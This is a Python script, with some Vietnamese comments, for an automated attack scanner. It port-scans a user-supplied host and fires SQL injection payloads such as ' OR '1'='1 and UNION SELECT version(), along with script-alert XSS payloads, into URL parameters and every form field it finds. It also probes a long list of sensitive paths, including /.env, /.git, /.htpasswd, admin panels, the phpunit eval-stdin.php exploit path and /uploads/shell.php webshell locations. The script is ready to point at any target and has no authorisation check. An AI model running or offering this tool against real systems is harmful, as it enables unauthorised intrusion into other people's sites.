import socket
import requests
import threading
from bs4 import BeautifulSoup

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36"
}

SQLI_ERRORS = [
    "You have an error in your SQL syntax", "Warning: mysql_", "SQL syntax error",
    "Unclosed quotation mark", "SQLSTATE["
]

COMMON_PORTS = {80, 443, 8080, 8443}

PAYLOADS = {
    "SQL Injection": ["' OR '1'='1", "admin' --", "' UNION SELECT null, version() --","admin' OR '1'='1' #"
],
    "XSS": ["<script>alert('XSS')</script>", "<img src='x' onerror='alert(1)'>"]
}

COMMON_PATHS = [
    # 🏴‍☠️ Common Authentication & Login Paths
    "/login", "/login.php", "/login.html", "/login.aspx", "/login.jsp", "/signin", "/auth",
    "/user/login", "/user/signin", "/admin/login", "/admin/auth", "/account/login",
    
    # 🔐 Admin & Control Panels
    "/admin", "/admin.php", "/admin.html", "/admin/login", "/admin/dashboard", "/admin/index",
    "/admin/panel", "/adminconsole", "/controlpanel", "/backend", "/management", "/root",
    "/secureadmin", "/moderator", "/administrator", "/sysadmin", "/staff", "/cms-admin",
    
    # 🛠️ CMS & Framework-Specific Paths
    "/wp-login.php", "/wp-admin", "/wp-content", "/wp-json", "/drupal", "/drupal/login",
    "/joomla/administrator", "/joomla/login", "/typo3/backend", "/phpmyadmin", "/pma",
    "/dbadmin", "/myadmin", "/databaseadmin", "/plesk", "/cPanel", "/webadmin",
    
    # ⚙️ API & Developer Paths
    "/api", "/api/v1/login", "/api/auth", "/api/token", "/api/admin", "/api/v1/user",
    "/graphql", "/oauth", "/oauth/token", "/auth/oauth2", "/auth/jwt", "/jwt/token",
    
    # 📂 Sensitive File & Debug Paths
    "/.git", "/.env", "/.htaccess", "/.htpasswd", "/config", "/config.php", "/config.json",
    "/debug", "/debugger", "/error_log", "/logs", "/system.log", "/var/log",
    
    # 🔄 Forgotten or Test Paths
    "/test", "/staging", "/beta", "/backup", "/old", "/temp", "/tmp", "/dev", "/qa",
    
    # 🔓 Common Dashboard URLs
    "/dashboard", "/dashboard/login", "/user/dashboard", "/profile", "/settings", "/account",
    
    # 🏢 Enterprise Software Panels
    "/zabbix", "/grafana", "/nagios", "/jenkins", "/jira", "/gitlab", "/confluence",
    "/kibana", "/splunk", "/elastic", "/sonarqube",
    
    # 🏴‍☠️ Known Exploit Targets
    "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/wp-content/plugins/revslider/temp/update_extract/revslider",
    "/cgi-bin/test-cgi", "/cgi-bin/status", "/cgi-bin/admin", "/cgi-bin/awstats.pl",
    "/cgi-bin/viewer.cgi", "/cgi-bin/jarrewrite", "/cgi-bin/php", "/cgi-bin/php5",

    # 🖼️ Public Upload Directories (User-Uploaded Files)
    "/uploads", "/upload", "/file_upload", "/files", "/media", "/user_uploads",
    "/images/uploads", "/profile_pics", "/avatars", "/content/uploads",
    "/data/uploads", "/public/uploads", "/assets/uploads",

    "/login.php", "/admin", "/user/login", "/auth", "/signin", "/dashboard", "/controlpanel",
    "/zabbix", "/zabbix/index.php", "/zabbix/setup.php", "/zabbix/api_jsonrpc.php",
    "/zabbix/zabbix.php?action=dashboard.view", "/zabbix/jsrpc.php",
    "/upload", "/file/upload", "/uploads", "/admin/upload", "/api/upload",
    "/aws/cloudwatch", "/aws/xray", "/aws/monitoring", "/aws/health",
    "/azure/monitor", "/azure/loganalytics", "/azure/applicationinsights", "/azure/securitycenter",
    "/prometheus", "/prometheus/graph", "/prometheus/alerts", "/prometheus/status","/messages", "/view/messages", "/user/messages", "/inbox", "/admin/messages","/view_messages.php",
    
    # 🗂️ Admin & Secure Upload Areas
    "/admin/uploads", "/admin/upload", "/secure/uploads", "/private/uploads",
    "/protected/uploads", "/backend/uploads", "/root/uploads",
    
    # 📂 API & Developer Upload Paths
    "/api/upload", "/api/uploads", "/upload-api", "/rest/upload", "/v1/upload",
    "/api/v1/uploads", "/upload/file", "/upload_image", "/upload/photo",
    
    # 📸 CMS-Specific Uploads (WordPress, Joomla, Drupal, etc.)
    "/wp-content/uploads", "/wp-admin/upload.php", "/joomla/media/uploads",
    "/drupal/sites/default/files", "/typo3/uploads", "/storage/uploads",
    
    # 🔄 Temporary or Backup Uploads
    "/temp/uploads", "/tmp/uploads", "/backup/uploads", "/old/uploads", "/staging/uploads",
    "/cache/uploads", "/logs/uploads",
    
    # 🎥 Video & Document Uploads
    "/videos/uploads", "/documents/uploads", "/docs/uploads", "/pdf/uploads",
    "/music/uploads", "/audio/uploads",
    
    # 🖥️ FTP & File Management Uploads
    "/ftp/uploads", "/filemanager/upload", "/browser/upload", "/webdav/uploads",
    
    # ⚠️ Known Exploitable Upload Paths
    "/cgi-bin/upload.cgi", "/upload.php", "/upload.jsp", "/upload.asp", "/upload.aspx",
    "/upload_handler.php", "/upload_file.php", "/ajax/upload", "/file/upload",
    "/uploads/user_images/", "/uploads/temp/", "/uploads/raw/",
    
    # 🏴‍☠️ Dangerous Testing Uploads
    "/uploads/shell.php", "/uploads/shell.jsp", "/uploads/shell.asp", "/uploads/shell.aspx",
    "/uploads/rce.php", "/uploads/malware.exe", "/uploads/webshell/",
    "/uploads/tmp/shell.php", "/uploads/temp/shell.php"
]

def scan_ports(target, port_range=range(1, 1025)):
    open_ports = []
    lock = threading.Lock()

    def scan(port):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.3)
                if s.connect_ex((target, port)) == 0:
                    with lock:
                        open_ports.append(port)
        except Exception:
            pass

    threads = []
    for port in port_range:
        t = threading.Thread(target=scan, args=(port,))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    return open_ports

def safe_request(url, method="GET", params=None, data=None):
    try:
        response = requests.request(method, url, headers=HEADERS, params=params, data=data, timeout=3)
        return response
    except requests.exceptions.RequestException:
        return None

def check_sqli(url, forms):
    for payload in PAYLOADS["SQL Injection"]:
        response = safe_request(url, params={"test": payload})
        if response and any(error in response.text for error in SQLI_ERRORS):
            print(f"[!] Found SQL Injection at {url} with payload: {payload}")
            return True
        
        for form in forms:
            action = form.get("action")
            inputs = form.find_all("input")
            form_url = url if not action else f"{url}/{action}"
            data = {input.get("name"): payload for input in inputs if input.get("name")}
            response = safe_request(form_url, method="POST", data=data)
            if response and any(error in response.text for error in SQLI_ERRORS):
                print(f"[!] Found SQL Injection at {form_url} with payload: {payload}")
                return True
    return False

def check_xss(url, forms):
    for payload in PAYLOADS["XSS"]:
        response = safe_request(url, params={"test": payload})
        if response and payload in response.text:
            print(f"[!] Found XSS at {url} with payload: {payload}")
            return True
        
        for form in forms:
            action = form.get("action")
            inputs = form.find_all("input")
            form_url = url if not action else f"{url}/{action}"
            data = {input.get("name"): payload for input in inputs if input.get("name")}
            response = safe_request(form_url, method="POST", data=data)
            if response and payload in response.text:
                print(f"[!] Found XSS at {form_url} with payload: {payload}")
                return True
    return False

def extract_forms(url):
    response = safe_request(url)
    if response:
        soup = BeautifulSoup(response.text, "html.parser")
        return soup.find_all("form")
    return []

def detect_protocol(target):
    if not target.startswith(("http://", "https://")):
        test_http = f"http://{target}"
        test_https = f"https://{target}"
        if safe_request(test_http):
            return test_http
        elif safe_request(test_https):
            return test_https
        else:
            print(f"[X] Cannot connect to {target}")
            return None
    return target

def find_common_paths(target):
    print("[+] Checking common paths...")
    for path in COMMON_PATHS:
        full_url = f"{target}{path}"
        response = safe_request(full_url)
        if response and response.status_code == 200:
            print(f"[+] Path found: {full_url}")
    
    # Kiểm tra robots.txt
    robots_url = f"{target}/robots.txt"
    response = safe_request(robots_url)
    if response and response.status_code == 200:
        print("[+] Found robots.txt, checking hidden paths...")
        for line in response.text.split("\n"):
            if "Disallow:" in line:
                hidden_path = line.split(": ")[-1].strip()
                full_hidden_url = f"{target}{hidden_path}"
                print(f"[+] Path from robots.txt: {full_hidden_url}")
    
    # Kiểm tra sitemap.xml
    sitemap_url = f"{target}/sitemap.xml"
    response = safe_request(sitemap_url)
    if response and response.status_code == 200:
        print("[+] Found sitemap.xml, extracting URL...")
        soup = BeautifulSoup(response.text, "xml")
        urls = soup.find_all("loc")
        for url in urls:
            print(f"[+] URL from sitemap: {url.text}")

def run_web_scan(target):
    target = detect_protocol(target)
    if not target:
        return
    print(f"[+] Scanning web at: {target}")
    forms = extract_forms(target)
    check_sqli(target, forms)
    check_xss(target, forms)
    find_common_paths(target)
    print(f"[+] Found {len(forms)} form inserting.")

def scan_target():
    target = input("Enter IP or domain to scan: ").strip()
    open_ports = scan_ports(target)
    print(f"[+] Open ports on {target}: {open_ports}" if open_ports else "[-] No open ports detected.")
    is_web_found = any(port in COMMON_PORTS for port in open_ports)
    if is_web_found:
        run_web_scan(target)
    else:
        choice = input("Cannot find web server. Do you want to force web scanning? (y/n): ").strip().lower()
        if choice == "y":
            target = input("Enter web URL (includes http/https): ").strip()
            run_web_scan(target)

if __name__ == "__main__":
    scan_target()
